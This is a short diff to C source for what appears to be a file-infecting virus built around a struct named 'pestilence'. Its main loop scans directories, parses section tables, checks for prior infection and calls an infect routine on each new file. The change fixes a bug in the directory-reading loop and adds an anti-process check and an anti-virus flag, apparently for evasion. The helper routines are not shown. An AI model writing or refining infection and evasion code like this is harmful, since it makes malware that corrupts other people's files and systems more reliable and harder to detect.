@@ -60,8 +60,9 @@ int main()
     
     while (i < 2)
     {
+        pestilence->anti_virus = 0;
         pestilence->dir = opendir(ft_getdir(i));
-        while (pestilence->readdir = readdir(pestilence->dir) != NULL)
+        while ((pestilence->readdir = readdir(pestilence->dir)) != NULL)
         {
             snprintf(path, sizeof(path), "%s/%s", ft_getdir(i), pestilence->readdir->d_name);
             if (pestilence->readdir->d_name[0] == '.')
@@ -71,6 +72,7 @@ int main()
                 continue;
             ft_pointer_section_table(pestilence);
             ft_pointer_strings_table(pestilence);
+            ft_antiprocess(pestilence);
             if (ft_detect_prev_infection(pestilence))
                 ft_infect(pestilence);
 
